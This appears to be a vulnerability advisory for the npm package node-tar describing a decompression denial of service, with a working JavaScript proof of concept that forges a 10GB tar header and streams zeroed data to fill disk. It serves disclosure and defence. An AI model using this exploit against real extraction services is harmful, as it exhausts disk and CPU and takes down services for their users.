# node-tar: Decompression/parse DoS via unlimited input

- CWE: CWE-770
- Packages: npm:tar

---

### Summary
A **Decompression/parse DoS via unlimited input** vulnerability in `node-tar` allows an attacker to exhaust server resources (disk space and CPU). Because the library does not enforce hard upper bounds on total decompressed data or entry counts, a small, maliciously crafted "Gzip Bomb" can be used to fill a server's storage and crash services.

### Details
The `node-tar` library does not enforce a hard upper bound on archive size or the volume of decompressed data processed during extraction. While the `maxReadSize` option exists, it only controls internal read chunk sizes (default 16MB) and does not limit the total cumulative bytes written to disk.

Specifically, in `src/extract.ts`, the `Unpack` stream processes entries as they arrive. There is no total-bytes limit, entry-count limit, or decompression ratio guard. An attacker can provide a TAR header claiming a massive file size (e.g., 10GB) and follow it with highly compressible data (like zeros). `node-tar` will continue to extract and write this data until the physical disk is exhausted, as it lacks a mechanism to abort based on global resource consumption.

### PoC
The following Proof of Concept demonstrates how a tiny compressed input can be expanded into gigabytes of data on the host machine almost instantly.

1. Create the exploit script:
```javascript
const fs = require('fs'), z = require('zlib'), t = require('tar');

const d = 'dos_test';
if (fs.existsSync(d)) fs.rmSync(d, {recursive:true});
fs.mkdirSync(d);

// Build 10GB header
const h = Buffer.alloc(512);
h.write('payload');
h.write((10*1024**3).toString(8).padStart(11,'0'), 124); 
h.write('ustar', 257);
let s = 256;
for(let i=0;i<512;i++) if(i<148||i>155) s+=h[i];
h.write(s.toString(8).padStart(6,'0'), 148);

const gz = z.createGzip();
gz.pipe(t.x({cwd: d}));
gz.write(h);

const b = Buffer.alloc(32 * 1024 * 1024); // 32MB chunks for speed

const run = () => {
  while (gz.write(b));
  gz.once('drain', run);
};

const monitor = setInterval(() => {
    try {
        const bytes = fs.statSync(`${d}/payload`).size;
        const mb = Math.floor(bytes / (1024 * 1024));
        process.stdout.write(`\r[>] Extracted: ${mb} MB`);
        
        if (mb > 5000) { 
            console.log('\n[!] VULN CONFIRMED: 5GB+ written from tiny input.'); 
            process.exit(); 
        }
    } catch {}
}, 50);

process.on('exit', () => {
    clearInterval(monitor);
    console.log('[*] Cleaning up...');
    if (fs.existsSync(d)) fs.rmSync(d, {recursive:true, force:true});
});

run();
```

2. Run the PoC:
```bash
node poc.js
```

**Observation:** You will see the extracted size rapidly climb to 5,000 MB+ within seconds, while the actual data being "sent" through the gzip stream is negligible.

### Impact
This is a **Denial of Service (DoS)** vulnerability. It impacts any application or service that uses `node-tar` to extract archives provided by untrusted users (e.g., npm registries, CI/CD pipelines, or file-sharing platforms). An unauthenticated attacker can send a small payload that expands to consume all available disk space, leading to system-wide failure and service outages.
